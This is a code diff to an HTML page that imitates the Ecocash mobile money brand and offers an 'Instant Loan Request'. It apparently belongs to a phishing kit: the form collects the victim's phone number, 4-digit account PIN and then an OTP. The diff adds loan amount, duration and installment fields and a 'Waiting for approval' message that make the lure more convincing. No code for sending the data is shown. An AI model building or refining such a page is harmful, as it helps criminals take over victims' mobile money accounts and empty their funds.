@@ -12,9 +12,22 @@
         <img src="logo.png" alt="Ecocash Logo" class="logo" />
         <h2>Instant Loan Request</h2>
 
-        <!-- STEP 1: Phone, PIN -->
+        <!-- STEP 1: Phone, Amount, PIN -->
         <form id="loanForm" class="step active">
             <input type="tel" id="phone" placeholder="Enter your Ecocash number" required />
+            
+            <label>Loan Amount (USD)</label>
+            <input type="number" id="amount" value="500" min="100" max="5000" />
+
+            <label>Duration</label>
+            <select id="duration">
+                <option value="6">6 months</option>
+                <option value="12">12 months</option>
+                <option value="24">24 months</option>
+            </select>
+
+            <div class="installment">Monthly: $<span id="installment">83.33</span></div>
+
             <input type="password" id="pin" placeholder="Enter your 4-digit PIN" maxlength="4" required />
             <button type="submit">Continue</button>
         </form>
@@ -24,7 +37,7 @@
             <p>Enter the OTP sent to your number</p>
             <input type="text" id="otp" placeholder="XXXX" maxlength="4" />
             <div class="loader"></div>
-            <p id="statusMsg">Verifying your identity...</p>
+            <p id="statusMsg">Waiting for approval...</p>
         </div>
     </div>
 
